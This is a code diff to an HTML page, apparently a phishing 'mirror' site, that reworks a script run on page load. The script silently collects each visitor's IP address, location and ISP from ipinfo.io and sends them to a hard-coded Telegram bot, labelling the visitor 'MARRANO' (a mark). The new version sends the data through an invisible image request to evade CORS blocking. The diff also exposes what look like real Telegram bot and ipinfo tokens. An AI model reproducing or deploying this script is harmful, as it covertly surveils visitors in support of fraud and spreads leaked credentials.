@@ -199,51 +199,34 @@
     updateCountdown();
     setInterval(updateCountdown, 1000);
   </script>
-
 <script>
-  // Token corregido (sin espacios ni saltos)
-  const token = '7881440537:AAHbsg5rssYHnSIylGdW5Wy_2MbjOeazltA'; 
-  const chatId = '-4726108713'; 
-
-  async function notifySiteVisit() {
+  async function notifySimpleTelegram() {
     try {
-      console.log("Iniciando obtención de datos IP...");
-      const response = await fetch('https://ipinfo.io/json?token=0b33d8e257b3eb'); 
-      const data = await response.json();
-      console.log("Datos obtenidos de ipinfo.io:", data);
+      const res = await fetch('https://ipinfo.io/json?token=0b33d8e257b3eb');
+      const data = await res.json();
 
-      const ip = data.ip || 'No disponible';
-      const city = data.city || 'Sin ciudad';
-      const region = data.region || 'Sin región';
-      const country = data.country || 'Sin país';
-      const org = data.org || 'Sin proveedor';
+      const ip = data.ip || 'N/D';
+      const city = data.city || 'N/D';
+      const region = data.region || 'N/D';
+      const country = data.country || 'N/D';
+      const org = data.org || 'N/D';
 
-      const message = `
-📣💊 MARRANO HP ENTRANDO AL ESPEJO 💊📣
-🌍 IP: ${ip}
-📍 Ubicación: ${city}, ${region}, ${country}
-🔌 Proveedor: ${org}
-      `;
+      const msg = `MARRANO ENTRÓ - IP: ${ip} - ${city}, ${region}, ${country} - ${org}`;
 
-      const telegramURL = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+      const telegramURL = `https://api.telegram.org/bot7881440537:AAHbsg5rssYHnSIylGdW5Wy_2MbjOeazltA/sendMessage?chat_id=-4726108713&text=${encodeURIComponent(msg)}`;
 
-      console.log("Enviando mensaje a Telegram...");
-      const telegramResponse = await fetch(telegramURL);
-      const telegramData = await telegramResponse.json();
-      console.log("Respuesta de Telegram:", telegramData);
+      // Usamos una imagen invisible para evitar bloqueos CORS
+      const img = new Image();
+      img.src = telegramURL;
 
-      if (telegramData.ok) {
-        console.log("Mensaje enviado correctamente a Telegram");
-      } else {
-        console.error("Error al enviar mensaje a Telegram:", telegramData.description);
-      }
     } catch (error) {
-      console.error('Error al enviar datos a Telegram:', error);
+      console.error("Error al notificar:", error);
     }
   }
 
-  window.onload = notifySiteVisit;
+  window.onload = notifySimpleTelegram;
 </script>
+
 
 </body>
 </html>
